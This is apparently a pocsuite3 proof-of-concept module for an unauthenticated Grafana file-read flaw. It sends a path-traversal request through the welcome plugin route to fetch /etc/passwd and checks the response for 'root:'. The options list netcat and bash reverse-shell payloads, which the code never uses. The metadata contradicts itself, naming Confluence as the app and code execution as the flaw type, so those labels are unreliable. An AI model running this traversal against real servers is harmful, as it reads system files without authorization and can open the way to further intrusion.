import base64
import binascii
from collections import OrderedDict
from urllib.parse import urljoin

import argparse
import struct
import random
import string
import requests
import re
import threading
import sys

from requests.exceptions import ReadTimeout

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptString, OptItems, \
    OptDict, VUL_TYPE

class DemoPOC(POCBase):
    vulID = '1'  # ssvid
    version = '3.0'
    author = ['N0puple']
    vulDate = '2021-12-08'
    createDate = '2021-12-08'
    updateDate = '2021-12-08'
    references = ['https://www.seebug.org/vuldb/ssvid-97343']
    name = 'grafana unauth file read'
    appPowerLink = ''
    appName = 'confluence'
    appVersion = '2.x,3.x'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''grafana unauth file read'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    protocol = POC_CATEGORY.PROTOCOL.HTTP
    pocDesc = '''grafana unauth file read'''

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString("whoami", description='攻击时自定义命令')
        o["app_version"] = OptItems(['2.x', 'Auto'],
                                    selected="Auto",
                                    description='目标版本，可自动匹配')
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
        }
        o["payload"] = OptDict(default=payload, selected="bash")
        return o

    def _verify(self):
        result = {}
        try:
            baseurl = urljoin(self.url, '/public/plugins/welcome/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd')
            text = requests.get(baseurl).text
            if "root:" in text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
            return self.parse_output(result)
        except Exception as e:
            pass
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not detected vulnerable')
        return output

register_poc(DemoPOC)
